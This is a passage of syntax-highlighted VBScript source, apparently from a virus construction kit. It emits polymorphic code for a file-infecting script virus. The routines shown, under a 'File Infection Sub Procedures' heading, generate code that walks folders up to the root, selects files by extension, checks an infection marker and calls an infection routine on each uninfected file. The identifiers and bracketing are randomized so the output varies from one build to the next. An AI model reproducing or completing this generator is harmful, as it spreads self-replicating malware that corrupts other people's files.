            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">VInfo.Dir2.Value</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir2.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Call "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir2.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">VInfo.Dir3.Value</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir3.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Call "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir3.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">VInfo.Dir4.Value</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir4.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Call "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir4.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">VInfo.Dir5.Value</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir5.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Call "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir5.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">else</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">select</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'-----------------------------------File Infection Sub Procedures--------------------------------
</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InsertInfectPath</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">RandInsertTxtHost</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.InfProb</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"None"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Sub "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
        </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectFolderRoutine</span><span class="sc0">
        </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InsertInfectFolderRoutine</span><span class="sc0">
    </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.FolderRoutine</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Default"</span><span class="sc0">
            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
            </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.CheckExist.checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"if "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".FolderExists("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">") then"</span><span class="sc0">
                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Tabamount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.Directory</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Parent"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                    </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.LoopOp</span><span class="sc6">)</span><span class="sc0">
                        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"LoopU"</span><span class="sc0">
                            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Do"</span><span class="sc0">
                        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"LoopW"</span><span class="sc0">
                            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Do"</span><span class="sc0">
                        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"WhileW"</span><span class="sc0">
                            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFolderObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".GetFolder("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
                            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"While "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFolderObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".IsRootFolder = False"</span><span class="sc0">
                    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">select</span><span class="sc0">
                        </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
                        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFolderObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".GetFolder("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
                        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.Directory</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Parent"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">RandOrder</span><span class="sc6">(</span><span class="sc7">VarInfPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".GetParentFolderName("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFileCollection</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFolderObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".Files"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
                        </span><span class="sc3">else</span><span class="sc0">
                            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFileCollection</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFolderObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".Files"</span><span class="sc0">
                        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
                        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"For each "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" in "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFileCollection</span><span class="sc0">
                        </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">TestRoutine</span><span class="sc0">
                        </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"next"</span><span class="sc0">
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.Directory</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Parent"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                    </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                    </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.LoopOp</span><span class="sc6">)</span><span class="sc0">
                        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"LoopU"</span><span class="sc0">
                            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Loop Until "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFolderObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".IsRootFolder = True"</span><span class="sc0">
                        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"LoopW"</span><span class="sc0">
                            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Loop While "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFolderObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".IsRootFolder = False"</span><span class="sc0">
                        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"WhileW"</span><span class="sc0">
                            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Wend"</span><span class="sc0">
                    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">select</span><span class="sc0">
                </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
            </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.CheckExist.checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"end if"</span><span class="sc0">
            </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">else</span><span class="sc0">
            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">CustomInfectFolder</span><span class="sc6">(</span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.FolderRoutine</span><span class="sc6">))</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">select</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">TestRoutine</span><span class="sc0">
    </span><span class="sc7">Uppercheck</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = ucase("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".GetExtensionName("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".Name))"</span><span class="sc0">
    </span><span class="sc3">else</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = lcase("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".GetExtensionName("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".Name))"</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"if "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">ParseExtensions</span><span class="sc6">(</span><span class="sc7">Uppercheck</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" then"</span><span class="sc0">
    </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.CheckInfected.checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">OpenFileMethod</span><span class="sc6">(</span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".path"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"True"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"False"</span><span class="sc6">))</span><span class="sc0">
            </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.Infcheck</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"TestString"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTestString</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".readline"</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".close"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"()"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"if "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarTestString</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" &lt;&gt; """</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0">  </span><span class="sc7">PreID</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""" then"</span><span class="sc0">
                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">VarInfFileName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".path"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Call "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFileName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".path)"</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"end if"</span><span class="sc0">
            </span><span class="sc3">else</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"if "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".readline &lt;&gt; """</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0">  </span><span class="sc7">PreID</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""" then"</span><span class="sc0">
                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".close"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"()"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">VarInfFileName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".path"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Call "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFileName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".path)"</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"else"</span><span class="sc0">
                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".close"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"()"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
